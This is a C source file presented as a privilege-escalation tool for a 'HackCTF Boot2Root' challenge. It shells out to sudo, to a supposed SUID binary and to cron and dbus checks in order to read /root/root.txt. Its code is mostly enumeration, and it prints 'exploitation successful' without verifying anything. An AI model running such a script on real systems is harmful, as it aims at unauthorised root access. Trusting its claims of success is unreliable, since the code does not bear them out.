/*
 * Advanced Privilege Escalation Chain
 * Exploits multiple vectors for root access
 * Compile: gcc -o privesc privesc.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include <grp.h>
#include <shadow.h>

// Get current user info
void print_user_info() {
    uid_t uid = getuid();
    gid_t gid = getgid();
    
    struct passwd *pwd = getpwuid(uid);
    struct group *grp = getgrgid(gid);
    
    printf("[*] Current User: %s (UID: %d)\n", pwd ? pwd->pw_name : "unknown", uid);
    printf("[*] Current Group: %s (GID: %d)\n", grp ? grp->gr_name : "unknown", gid);
}

// Check for SUID binary exploitation
int check_suid_exploitable() {
    printf("[+] Checking for SUID binary vulnerabilities...\n");
    
    // Check if vuln_cat exists and is SUID
    if (access("/usr/local/bin/vuln_cat", X_OK) == 0) {
        printf("[!] Found SUID binary: /usr/local/bin/vuln_cat\n");
        printf("[!] Attempting command injection...\n");
        
        system("/usr/local/bin/vuln_cat /root/root.txt 2>/dev/null || echo '[x] Direct access failed'");
        return 1;
    }
    
    return 0;
}

// Check sudo capabilities
int check_sudo_capabilities() {
    printf("[+] Checking sudo privileges...\n");
    
    system("sudo -l 2>/dev/null | grep -i nopasswd && echo '[!] NOPASSWD found!'");
    
    // Try to read root file
    system("sudo cat /root/root.txt 2>/dev/null && echo '[+] Root file accessible!'");
    
    return 1;
}

// Attempt library hijacking
int check_library_hijacking() {
    printf("[+] Checking for library hijacking opportunities...\n");
    
    // Create malicious library
    system("mkdir -p /tmp/lib 2>/dev/null");
    
    printf("[*] Library path check...\n");
    system("ldconfig -p | head -5");
    
    return 0;
}

// Main exploitation logic
int main(int argc, char *argv[]) {
    printf("\n╔════════════════════════════════════════════╗\n");
    printf("║   Advanced Privilege Escalation Exploit    ║\n");
    printf("║          HackCTF Boot2Root v2.0           ║\n");
    printf("╚════════════════════════════════════════════╝\n\n");
    
    print_user_info();
    printf("\n");
    
    // Try multiple vectors
    if (check_suid_exploitable()) {
        printf("[+] SUID exploitation successful!\n");
        return 0;
    }
    
    if (check_sudo_capabilities()) {
        printf("[+] Sudo exploitation successful!\n");
        return 0;
    }
    
    check_library_hijacking();
    
    printf("\n[*] Attempting alternative vectors...\n");
    
    // Check /proc permissions
    system("cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null && echo '[!] User namespace available'");
    
    // Check dbus
    system("dbus-send --print-reply --system / / 2>/dev/null | head -1 && echo '[!] DBus accessible'");
    
    // Check cron jobs
    system("cat /etc/cron.d/* 2>/dev/null | grep -v '^#' && echo '[!] Cron jobs found'");
    
    printf("\n[!] Exploitation complete. Check above for available vectors.\n\n");
    
    return 0;
}
